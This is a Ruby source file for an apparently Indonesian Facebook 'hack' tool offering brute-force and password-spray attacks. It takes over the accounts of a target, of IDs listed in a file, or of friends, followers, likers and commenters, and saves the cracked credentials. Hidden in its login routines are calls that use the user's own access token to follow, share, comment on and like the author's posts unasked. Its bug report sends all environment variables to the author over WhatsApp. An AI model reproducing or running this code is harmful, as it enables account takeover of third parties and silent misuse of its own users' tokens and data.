=begin

MIT License

Copyright (c) 2021 Rahmat ^_^ <rahmadadha11@gmail.com>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

=end

$LOAD_PATH.unshift File.expand_path(".", "lib")

require 'threadpool'
require 'io/console'
require 'net/https'
require 'open-uri'
require 'net/http'
require 'rubygems'
require 'thread'
require 'digest'
require 'open3'
require 'files'
require 'json'
require 'erb'
require 'uri'
require 'os'

if OS.linux?
  $r = "\033[1;91m"
  $g = "\033[1;92m"
  $y = "\033[1;93m"
  $p = "\033[1;94m"
  $m = "\033[1;95m"
  $c = "\033[1;96m"
  $w = "\033[1;97m"
  $a = "\033[1;0m"
else
  $r = ""
  $g = ""
  $y = ""
  $p = ""
  $m = ""
  $c = ""
  $w = ""
  $a = ""
end

def loading!
  for x in [".   ", "..  ", "... ",".... ","\n"]
    $stdout.write("\r#{$r}[!] #{$g}Please Wait"+x)
    $stdout.flush()
    sleep(1)
  end
end

$logo = " \n#{$w}█████████\n#{$w}█▄█████▄█      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --_--#{$g}╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n#{$w}█ #{$w} #{$w}_-_-- -_ --__#{$g} ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _ --#{$g}═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ #{$y}ELITE v1.1\n#{$w}█████████      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w} ██ ██\n#{$w}╔════════════════════════════════════════╗\n#{$w}║#{$y}* #{$w}Author  #{$r}: #{$c}Rahmat adha#{$w}                 ║\n#{$w}║#{$y}* #{$w}Github  #{$r}: #{$c}github.com/MR-X-Junior/#{$w}     ║\n#{$w}║#{$y}* #{$w}Wa      #{$r}: #{$c}+62 85754629509   #{$w}          ║\n#{$w}║#{$y}* #{$w}#{RUBY_ENGINE}#{' '*(8 - RUBY_ENGINE.length)}#{$r}: #{$c}#{RUBY_VERSION}   #{$w}                    ║\n#{$w}║#{$y}* #{$w}Version #{$r}: #{$c}1.1                         #{$w}║\n#{$w}╚════════════════════════════════════════╝#{$a}"
$user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
$indonesia = false

def tik(teks)
  for i in teks.chars << "\n"
    $stdout.write(i)
    $stdout.flush()
    sleep(0.05)
  end
end

def tok(teks,delay = 0.03)
  for i in teks.chars
    $stdout.write(i)
    $stdout.flush()
    sleep(delay)
  end
end

def Request(method = 'GET',token = $token,path)
  uri = URI("https://graph.facebook.com/#{path}&method=#{method}&access_token=#{token}")
  Net::HTTP.start(uri.hostname,uri.port,:use_ssl => (uri.scheme == 'https')) do |http|
    request = Net::HTTP::Get.new(uri)
    response = http.request(request)
    jeson = JSON.parse(response.body)
    return jeson
  end
end

def ReportBug()
  msg = ""
  msg << "environment\n===========\n"
  ENV.keys.each{|i| msg << "#{i} : #{ENV[i]}\n"}
  begin
    Open3.popen3("termux-info") do |stdin, stdout, stderr, thread|
      msg << "\nTermux-Info\n===========\n"
      msg << stdout.read.chomp
    end
  rescue Errno::ENOENT
  end
  msg << "\n\nPlatform\n==========\n"
  platform = Gem::Platform.local
  msg << "CPU : #{platform.cpu}\n"
  msg << "OS : #{platform.os}\n"
  msg << "Version : #{platform.version}\n"
  msg << "\nProgram\n========\n"
  msg << "File Name : #{$0}\n"
  msg << "File Path : #{File.realpath($0)}\n"
  msg << "File Size : #{File.size($0)}\n"
  msg << "\nRuby\n========\n"
  msg << "Ruby Engine : #{RUBY_ENGINE}\n"
  msg << "Ruby Version : #{RUBY_VERSION}\n"
  msg << "Ruby Platform : #{RUBY_PLATFORM}\n"
  msg << "Ruby Release Date : #{RUBY_RELEASE_DATE}\n"
  text = ERB::Util.url_encode(msg)
  system ("xdg-open https://wa.me/6285754629509?text=#{text}")
  abort ("#{$r}[!] Exit!")
end

def login()
  begin
    system('clear')
    puts ($logo)
    puts ("#{$w}║-> 1. Login Via email/password#{$a}")
    puts ("#{$w}║-> 2. Login Via Token#{$a}")
    puts ("#{$w}║-> 3. Login Via Cookie#{$a}")
    puts ("#{$w}║-> 4. Report Bug#{$a}")
    puts ("#{$w}║-> 0. Exit#{$a}")
    print ("#{$w}╚═#{$r}▶#{$w} ")
    log = gets.chomp!
    case log
      when '1'
        loginpw()
      when '2'
        loginto()
      when '3'
        loginco()
      when '4'
        ReportBug()
      when '0'
        abort("#{$r}[!] Exit#{$a}")
      else
        puts ("#{$y}[!] Invalid Input!#{$a}")
        sleep(0.9) ; login()
    end
  rescue SocketError
    abort ("#{$r}[!] No Connection#{$a}")
  rescue Errno::ETIMEDOUT
    abort ("#{$y}[!] Connection timed out#{$a}")
  rescue Interrupt
    abort ("#{$r}[!] Exit#{$a}")
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("#{$y}[!] There is an error\n[!] Please Try Again#{$a}")
  end
end

def loginpw()
  system('clear')
  puts ($logo)
  puts ("#{$w}═"*52)
  puts ("#{$r}[+] #{$g}LOGIN ACCOUNT FACEBOOK #{$r}#{$a}")
  print ("#{$r}[+] #{$g}email|id #{$r}: #{$c}")
  email = gets.chomp!
  print ("#{$r}[+] #{$g}password #{$r}: #{$c}")
  pass = STDIN.noecho(&:gets).chomp!
  puts ("\n")
  loading!
  a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pass + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
  b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': email, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pass, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
  c = Digest::MD5.new
  c.update(a)
  d = c.hexdigest
  b.update({'sig': d})
  uri = URI("https://api.facebook.com/restserver.php")
  uri.query = URI.encode_www_form(b)
  request = Net::HTTP::Get.new(uri)
  request["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
  response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => (uri.scheme == 'https')) {|http| http.request(request)}
  res = JSON.parse(response.body)
  if res.key? ('access_token')
    $token = res['access_token']
    fopen = File.open('login.txt','w')
    fopen.write($token)
    fopen.close()
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hello sir","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
    puts ("#{$g}[✓] Login Success#{$a}")
    sleep(0.5)
    Masuk()
  elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
    puts ("#{$r}[!] #{$y}username #{$r}: #{$w}#{email}#{$a}")
    puts ("#{$r}[!] #{$y}password #{$r}: #{$w}#{pass}#{$a}")
    abort ("#{$r}[!] #{$y}status.  #{$r}: Account Has Been Checkpoint#{$a}")
  else
    tik("#{$r}[!] Login Failed!#{$a}")
    sleep(1) ; loginpw()
  end
end

def loginto()
  system("clear")
  puts ($logo)
  #puts ("#{$w}═"*52)
  #puts ("#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r}[+]#{$a}")
  #print ("#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
  tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r} [+]#{$a}\n#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
  $token = gets.chomp!
  loading!
  req = Request("v10.0/me?")
  if req.key? ('name')
    fopen = File.open('login.txt','w')
    fopen.write($token)
    fopen.close()
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"].sample,"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token}) 
    $name = req['name']
    $id = req['id']
    puts ("#{$g}[✓] Login Success!#{$a}")
    sleep(0.9)
    menu()
  elsif req.key? ('error') and req['error']['code'] == 190
    puts ("#{$y}[!] #{req['error']['message']}#{$a}")
    sleep(0.9)
    loginto()
  else
    puts ("#{$r}[!] Invalid Access Token!#{$a}!")
    sleep(0.9)
    loginto()
  end
end

def loginco()
  system ('clear')
  puts ($logo)
  tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA COOKIES #{$r}[+]\n#{$r}[+] #{$g}Enter Cookies #{$r}: #{$a}")
  cookie = gets.chomp!
  loading!
  uri = URI('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
  req = Net::HTTP::Get.new(uri)
  req["user-agent"] = $user_agent
  req["referer"] = "https://m.facebook.com/"
  req["host"] = "m.facebook.com"
  req["origin"] = "https://m.facebook.com"
  req["upgrade-insecure-requests"] = "1"
  req["accept-language"] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
  req["cache-control"] = "max-age=0"
  req["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
  req["content-type"] = "text/html; charset=utf-8"
  req["cookie"] = cookie
  res = Net::HTTP.start(uri.hostname, uri.port,:use_ssl => true) {|http| http.request(req)}
  $token = res.body.match(/EAAA\w+/)
  if !$token.nil?
    a = Net::HTTP.get(URI("https://graph.facebook.com/v10.0/me?access_token=#{$token}"))
    b = JSON.parse(a)
    if !b.key? ('name')
      puts ("#{$y}[!] There is an error")
      sleep(0.9)
      loginco()
    else
      $name = b['name']
      $id = b['id']
      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁"].sample,"access_token"=>$token})  
      File.open("login.txt", "w") { |f| f.write($token) }
      puts ("#{$g}[✓] Login Success#{$a}")
      sleep(0.4)
      menu()
    end
  else
    puts ("#{$y}[!] Invalid Cookies!")
    sleep(0.9)
    loginco()
  end
end

def Masuk()
  begin
    api = URI("https://api.myip.com")
    req = Net::HTTP.get(api)
    res = JSON.parse(req)
    $indonesia = true if res['country'] == "Indonesia"
    $token = File.read("login.txt")
    req = Request("v10.0/me?")
    if req.key? ('name')
      $name = req['name']
      $id = req['id']
      menu()
    else
      puts ("#{$r}[!] Invalid Access Token!#{$a}")
      File.delete("login.txt")
      sleep(0.9)
      login()
    end
  rescue Errno::ENOENT
    login()
  rescue SocketError
    abort ("#{$r}[!] No Connection#{$a}")
  rescue Errno::ETIMEDOUT
    abort ("#{$y}[!] Connection timed out#{$a}")
  rescue Interrupt
    abort ("#{$r}[!] Exit#{$a}")
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("#{$y}[!] There is an error\n[!] Please Try Again#{$a}")
  end
end

def menu()
  system('clear')
  puts ($logo)
  puts ("#{$w}╔══════════════════════════════════════════════════╗")
  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}Name : #{$g}" + $name + " "*(39 - $name.length()) + "#{$w}║")
  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}ID.  : #{$g}" + $id + " "*(39 - $id.length()) + "#{$w}║")
  puts ("#{$w}╠══════════════════════════════════════════════════╝")
  puts ("║-> #{$w}1. MyFrofil")
  puts ("║-> #{$w}2. User Information")
  puts ("║-> #{$w}3. Hack Facebook Account")
  puts ("║-> #{$w}4. Bot")
  puts ("║-> #{$w}5. Others")
  puts ("║-> #{$w}6. Feedback")
  puts ("║-> #{$w}7. Update")
  puts ("║-> #{$w}8. Logout")
  puts ("║-> #{$w}0. exit")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  pilih = gets.chomp!
  case pilih
    when '1'
      Myfrofil()
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      menu()
    when '2'
      Info()
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      menu()
    when '3'
      Hamker()
    when '4'
      Bot()
    when '5'
      lain()
    when '6'
      ReportBug()
    when '7'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      code = system ('git pull')
      if code.nil?
        abort ("#{$y}[!] Git Not Installed\n#{$r}[!] Exit#{$a}")
      elsif code == false
        abort ("#{$r}[!] Error")
      else
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        menu()
      end
    when '8'
      print ("Do You Want To Continue? [Y/n] ")
      sure = gets.chomp!
      if sure.downcase == 'y'
        puts ("#{$0} : Deleting File login.txt")
        sleep(0.3)
        begin
          File.delete("login.txt")
          abort ("#{$0} : Successfully Deleting the login.txt file")
        rescue
          puts ("#{$0} : Failed to delete the login.txt file")
        end
      else
        sleep(0.2)
        menu()
      end
    when '0'
      abort ("#{$r}[!] Goodbye #{$name}#{$a}")
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      menu()
          
  end
      
end

def Myfrofil()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  a = Request("v10.0/me?")
  abort ("#{$y}[!] Error#{$a}") if a.key? ('error')
  b = Request("me/subscribers?")
  c = Request("me/subscribedto?")
  d = Request("me/friends?")
  ikuti = b['summary']['total_count'].to_s
  mengikuti = c['summary']['total_count'].to_s if not c['data'].empty?
  mengikuti = "0" if c['data'].empty?
  temen = d["data"].each {|i| i['id']}.length.to_s if not d['data'].empty?
  temen = "0" if d['data'].empty?
  puts ("#{$g}[✓] Name : #{a['name']}")
  puts ("#{$g}[✓] Id : #{a['id']}")
  puts ("#{$g}[✓] Friend : #{temen}")
  puts ("#{$g}[✓] Followers : #{ikuti}")
  puts ("#{$g}[✓] Following : #{mengikuti}")
  puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
  puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
  puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
  a['interested_in'].each {|i| puts ("#{$g}[✓] Interested in: "+i)} if a.key? ('interested_in')
  puts ("#{$g}[✓] Email : #{a['email']}") if a.key? ('email')
  puts ("#{$g}[✓] Phone : #{a['mobile_phone']}") if a.key? ('mobile_phone')
  puts ("#{$g}[✓] Location : #{a['location']['name']}") if a.key? ('location')
  puts ("#{$g}[✓] Hometown : #{a['hometown']['name']}") if a.key? ('hometown')
  a['education'].each {|i| puts ("#{$g}[✓] #{i['type']} : #{i['school']['name']}")} if a.key? ('education')
  a['work'].each {|i| puts ("#{$g}[✓] Work : #{i['employer']['name']}")} if a.key? ('work')
end

def Info()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] User Id : ")
  id = gets.chomp! ; id = id.tr(" ","")
  a = Request("#{id}?")
  if a.key? ('error')
    puts ("#{$y}[!] User Not Found")
  else
    puts ("#{$w}[+] Pleace Wait")
    puts ("#{$w}#{'═'*52}")
    b = Request("#{id}/subscribers?")
    c = Request("#{id}/subscribedto?")
    d = Request("me/friends?")
    ikuti = b['summary']['total_count'].to_s
    mengikuti = c['summary']['total_count'].to_s if not c['data'].empty?
    mengikuti = "0" if c['data'].empty?
    temen = d["data"].each {|i| i['id']}.length.to_s if not d['data'].empty?
    temen = "0" if d['data'].empty?
    puts ("#{$g}[✓] Name : #{a['name']}")
    puts ("#{$g}[✓] Id : #{a['id']}")
    puts ("#{$g}[✓] Friend : #{temen}")
    puts ("#{$g}[✓] Followers : #{ikuti}")
    puts ("#{$g}[✓] Following : #{mengikuti}")
    puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
    puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
    puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
    a['interested_in'].each {|i| puts ("#{$g}[✓] Interested in: "+i)} if a.key? ('interested_in')
    puts ("#{$g}[✓] Email : #{a['email']}") if a.key? ('email')
    puts ("#{$g}[✓] Phone : #{a['mobile_phone']}") if a.key? ('mobile_phone')
    puts ("#{$g}[✓] Location : #{a['location']['name']}") if a.key? ('location')
    puts ("#{$g}[✓] Hometown : #{a['hometown']['name']}") if a.key? ('hometown')
    a['education'].each {|i| puts ("#{$g}[✓] #{i['type']} : #{i['school']['name']}")} if a.key? ('education')
    a['work'].each {|i| puts ("#{$g}[✓] Work : #{i['employer']['name']}")} if a.key? ('work')
  end
end

def Hamker()
  system('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("║-> #{$w}1. Mini Hack Facebook [#{$g}Target#{$w}]")
  puts ("║-> #{$w}2. Multi Bruteforce Facebook")
  puts ("║-> #{$w}3. Super Multi Bruteforce Facebook")
  puts ("║-> #{$w}4. BruteForce [#{$g}Target#{$w}]")
  puts ("║-> #{$w}5. Get id/mail/phone")
  puts ("║-> #{$w}0. Back")
  print("╚═#{$r}▶#{$w} ")
  hack = gets.chomp!
  case hack
    when '1'
      Mini()
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Hamker()
    when '2'
      Multi()
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Hamker()
    when '3'
      Super()
    when '4'
      Brutal()
    when '5'
      GetMenu()
    when '0'
      menu()
    else
      puts ("#{$y}[!] Invalid Input!")
      sleep(0.9) ; Hamker()
  end
end

def Mini()
  gagal = true
  system('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp!
  req = Request("#{id}?")
  if req.key? ("error")
    puts ("#{$y}[+] User Not Found")
  else
    puts ("#{$w}[+] Target Name : #{req['name']}")
    puts ("#{$w}[!] CRACK!")
    puts ("#{$w}#{'═'*52}")
    name = ERB::Util.url_encode(req['name'])
    first = ERB::Util.url_encode(req['first_name'])
    last = ERB::Util.url_encode(req['last_name'])
    password = [name + '123', name + '321', name + '12345', name + '54321', first + '123', first + '321', first + '12345', first + '54321', last + '123', last + '321', last + '12345', last + '54321']
    ["Sayang","Anjing","Kontol","Doraemon"].each {|i| password << i} if $indonesia
    for pass in password
      url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
      r = URI.open(url,'User-Agent'=>$user_agent).read()
      res = JSON.parse(r)
      if res.key? ('access_token')
        puts ("#{$g}[✓] Success")
        puts ("#{$g}[✓] Name : #{req['name']}")
        puts ("#{$g}[✓] Birthday : #{req['birthday']}") if req.key? ('birthday')
        puts ("#{$g}[✓] username : #{id}")
        puts ("#{$g}[✓] password : #{pass}")
        gagal = false
        break
      elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
        puts ("#{$y}[!] Account Has Been Checkpoint")
        puts ("#{$y}[✓] Name : #{req['name']}")
        puts ("#{$y}[✓] Birthday : #{req['birthday']}") if req.key? ('birthday')
        puts ("#{$y}[✓] username : #{id}")
        puts ("#{$y}[✓] password : #{pass}")
        gagal = false
        break
      end
    end
    puts ("#{$r}[!] Sorry, opening password target failed :(\n[!] Try other method.") if gagal
  end
end
 
 def Multi()
  $cp = 0
  $ok = 0
  th = []
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] File Id  : ")
  files = gets.chomp!
  if File.file? (files)
    buka = File.readlines(files, chomp: true)
    $file = File.open(files)
    print ("#{$w}[+] Password : ")
    $pwd = gets.chomp!
    puts ("#{$w}[+] Total Id : #{buka.length}")
    puts ("#{$w}#{'═'*52}")
    40.times{th << Thread.new{crack!}}
    th.each(&:join)
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Total OK : #{$ok}")
    puts ("#{$y}[!] Total CP : #{$cp}")
  else
    puts ("#{$y}[!] File Not Found")
  end
end

def crack!
  loop do
    begin
      usr = $file.readline.strip
      uri = URI('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + $pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
      req = Net::HTTP.get(uri)
      req = JSON.parse(req)
      if req.key? ('access_token')
        $ok += 1
        z = File.open("multi.txt","a")
        z.write("#{usr} | #{$pwd}\n")
        z.close()
        puts ("#{$g}[OK] #{usr} | #{$pwd}")
      elsif req.key? ('error_msg') and req['error_msg'].include? ('www.facebook.com')
        $cp += 1
        z = File.open("multi.txt","a")
        z.write("#{usr} | #{$pwd}\n")
        z.close()
        puts ("#{$y}[CP] #{usr} | #{$pwd}")
      end
    rescue SocketError
      puts ("#{$r}[!] No Connection#{$a}")
      sleep(1)
    rescue Errno::ETIMEDOUT
      puts ("#{$y}[!] Connection timed out#{$a}")
    rescue EOFError
      break
    end
  end
end

def Super()
  $cp = 0
  $ok = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("║-> #{$w}1. Crack from Friends")
  puts ("║-> #{$w}2. Crack from Followers")
  puts ("║-> #{$w}3. Crack from Like")
  puts ("║-> #{$w}4. Crack from Comment")
  puts ("║-> #{$w}5. Crack Friends from Friends")
  puts ("║-> #{$w}6. Crack Followers from Friends")
  puts ("║-> #{$w}0. Back")
  print ("╚═#{$r}▶#{$w} ")
  hack = gets.chomp!
  case hack
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] Pleace Wait")
      a = Request("me/friends?")
      b = a['data'].map {|i| i['id']}
      puts ("#{$w}[+] Total Id : #{b.length}")
      puts ("#{$w}[+] CRACK!")
      puts ("#{$w}#{'═'*52}")
      main(b)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Total OK : #{$ok}")
      puts ("#{$y}[!] Total CP : #{$cp}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Super()
    when '2'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] Pleace Wait")
      a = Request("me?subscribers?limit=5000")
      if a['data'].empty?
        puts ("#{$y}[!] Your Account Has No Followers")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        b = a['data'].map {|i| i['id']}
        puts ("#{$w}[+] Total Id : #{a['summary']['total_count']}")
        puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['summary']['total_count']
        puts ("#{$w}[+] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(b)
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '3'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Post Id : ")
      id = gets.chomp! ; id.tr(" ","")
      a = Request("#{id}?")
      if a.key? ('error')
        puts ("#{$w}[!] Posts Not Found#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif !a.key? ('likes')
        puts ("#{$y}[!] No Likes On Posts")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Posted by #{a['from']['name']}")
        b = Request("#{id}/likes?summary=true&limit=5000")
        c = b['data'].map {|i| i['id']}
        puts ("#{$w}[+] Total Like : #{b['summary']['total_count']}")
        puts ("#{$y}[!] Total ID that can be cracked : #{c.length}") if c.length != b['summary']['total_count']
        puts ("#{$w}[!] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(c)
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '4'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Post Id : ")
      id = gets.chomp! ; id.tr(" ","")
      a = Request("#{id}?")
      if a.key? ('error')
        puts ("#{$w}[!] Posts Not Found#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif !a.key? ('comments')
        puts ("#{$y}[!] No Comments On Posts")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Posted by #{a['from']['name']}")
        b = Request("#{id}/comments?summary=true&limit=5000")
        c = b['data'].map {|i| i['from']['id']}.uniq
        puts ("#{$w}[+] Total Id : #{c.length}")
        puts ("#{$w}[!] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(c)
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '5'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp! ; id.tr(" ","")
      a = Request("#{id}?fields=name")
      if a.key? ('error')
        puts ("#{$y}[!] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Crack From : #{a['name']}")
        b = Request("#{id}/friends?")
        c = b['data'].map {|i| i['id']}
        puts ("#{$w}[+] Total id : #{c.length}")
        puts ("#{$w}[+] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(c)
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
       Super()
      end
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      a = Request("#{id}?fields=name,subscribers.limit(5000).summary(true)")
      if a.key? ('error')
        puts ("#{$r}[!] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif a['subscribers']['data'].empty?
        puts ("#{$y}[!] Account Has No Followers")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        #b = a['subscribers']['data'].map {|i| i['id']}
        puts ("#{$w}[+] Crack From : #{a['name']}")
        puts ("#{$w}[+] Total Followers : #{a['subscribers']['summary']['total_count']}")
        b = a['subscribers']['data'].map {|i| i['id']}
        puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['subscribers']['summary']['total_count']
        puts ("#{$w}[+] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(b)
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '0'
      Hamker()
    else
      puts ("#{$y}[!] Invalid Input")
